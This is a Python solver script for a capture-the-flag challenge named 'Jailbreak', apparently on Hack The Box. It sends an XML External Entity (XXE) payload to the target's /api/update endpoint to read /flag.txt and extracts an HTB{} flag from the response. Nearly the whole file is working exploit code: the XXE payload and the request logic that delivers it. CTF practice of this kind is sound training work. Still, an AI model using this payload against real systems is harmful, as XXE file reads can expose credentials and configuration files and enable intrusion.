#!/usr/bin/env python3
"""
Jailbreak CTF Challenge Solver
Exploits XXE vulnerability to read /flag.txt
"""
import requests
import sys
import re

def exploit_xxe(target_url):
    """Exploit XXE to read /flag.txt"""
    
    # Remove trailing slash
    target_url = target_url.rstrip('/')
    api_url = f"{target_url}/api/update"
    
    # XXE payload to read /flag.txt
    payload = '''<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
    </Firmware>
</FirmwareUpdateConfig>'''
    
    headers = {
        "Content-Type": "application/xml"
    }
    
    print("[*] Exploiting XXE vulnerability...")
    print(f"[*] Target: {api_url}")
    
    try:
        response = requests.post(api_url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            message = data.get("message", "")
            
            print(f"\n[+] Server Response: {message}")
            
            # Extract flag using regex
            flag_match = re.search(r'HTB\{[^}]+\}', message)
            if flag_match:
                flag = flag_match.group(0)
                print(f"\n{'='*60}")
                print(f"FLAG: {flag}")
                print(f"{'='*60}")
                return flag
            else:
                print("[-] Flag not found in response")
                return None
        else:
            print(f"[-] Error: HTTP {response.status_code}")
            print(f"[-] Response: {response.text}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return None

if __name__ == "__main__":
    print("="*60)
    print("JAILBREAK - XXE EXPLOITATION")
    print("="*60)
    
    if len(sys.argv) < 2:
        print("\nUsage: python3 solver.py <TARGET_URL>")
        print("Example: python3 solver.py http://94.237.49.128:48071")
        sys.exit(1)
    
    target = sys.argv[1]
    exploit_xxe(target)
